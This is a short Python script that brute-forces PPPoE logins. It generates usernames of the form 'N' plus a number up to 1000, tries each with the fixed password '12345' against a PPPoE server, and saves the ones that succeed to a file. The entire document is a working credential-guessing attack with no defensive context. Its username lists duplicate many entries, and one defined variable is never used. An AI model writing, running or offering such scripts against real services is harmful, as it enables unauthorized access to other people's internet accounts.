import pppoe
import itertools

# Define the username prefix and range of numbers to try
username_prefix = "N"
username_range = range(1, 1001)

# Generate all possible usernames with one, two, or three digits
usernames = [f"{username_prefix}{n:03d}" for n in username_range] + \
            [f"{username_prefix}{n:02d}" for n in username_range] + \
            [f"{username_prefix}{n:01d}" for n in username_range]

# Define the PPPoE server and credentials
pppoe_server = "pppoe.example.com"
pppoe_username = ""
pppoe_password = "12345"

# Try logging in with each username and save successful logins to a file
with open("successful_logins.txt", "w") as f:
    for username in usernames:
        print(f"Trying username: {username}")
        try:
            session = pppoe.PPPoE_Session(pppoe_server, username, pppoe_password)
            session.connect()
            print(f"Successful login: {username}")
            f.write(f"{username}\n")
            session.disconnect()
        except pppoe.PPPoE_Exception as e:
            print(f"Login failed: {e}")
